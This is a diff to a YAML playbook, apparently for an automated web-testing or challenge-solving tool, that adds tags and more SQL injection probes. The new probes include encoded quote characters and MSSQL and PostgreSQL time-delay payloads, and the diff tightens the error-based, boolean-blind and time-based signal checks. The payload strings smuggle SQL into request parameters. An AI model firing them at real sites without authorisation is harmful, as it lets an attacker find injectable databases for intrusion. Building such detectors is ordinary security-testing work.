@@ -1,11 +1,18 @@
 id: web_sqli
 name: SQL Injection
 category: web
-version: "1.0"
+version: "1.1"
 author: system
 description: >
   Detects and exploits SQL injection via error-based, boolean-blind,
   time-based, and union-based techniques.
+
+tags:
+  - sqli
+  - sql-injection
+  - blind-sqli
+  - error-based
+estimated_duration_seconds: 35
 
 applies_when:
   - "context.challenge.type == 'web'"
@@ -30,10 +37,16 @@ detection:
         - id: single_quote_probe
           action: http_probe
           with:
-            payloads: ["'", "''", '"', '`']
+            payloads: ["'", "''", '"', '`', "%27", "%2527"]
             inject_into: all_params
+            mutation_families: [param_remove, value_empty]
+            target_selector: all_inputs
+            mutation_budget:
+              max_total_variants: 12
+              max_per_family: 4
           signals:
-            - match: "SQL syntax|mysql_fetch_array|ORA-[0-9]+|sqlite.*error|pg_query"
+            - match:
+                condition: "response.status in [400, 500] and re.search(r'SQL syntax|mysql_fetch_array|ORA-[0-9]+|sqlite.*error|pg_query|SQLSTATE', response.body, re.I)"
               on_match:
                 confidence_boost: 0.85
                 emit: error_based_confirmed
@@ -49,7 +62,7 @@ detection:
             inject_into: all_params
           signals:
             - match:
-                condition: "true_response.body != false_response.body"
+                condition: "response_delta.status_changed or (true_response.body != false_response.body and response_delta.body_similarity_score >= 0.75) or response_delta.auth_state_changed"
               on_match:
                 confidence_boost: 0.70
                 emit: boolean_based_confirmed
@@ -60,11 +73,11 @@ detection:
         - id: sleep_probe
           action: http_probe
           with:
-            payloads: ["' AND SLEEP(3)--", "'; SELECT pg_sleep(3)--"]
+            payloads: ["' AND SLEEP(3)--", "'; SELECT pg_sleep(3)--", "' WAITFOR DELAY '0:0:3'--", "' OR pg_sleep(3)--"]
             inject_into: all_params
           signals:
             - match:
-                condition: "response_time >= 3000"
+                condition: "response_time >= 3000 and response.status in [200, 500]"
               on_match:
                 confidence_boost: 0.65
                 emit: time_based_confirmed
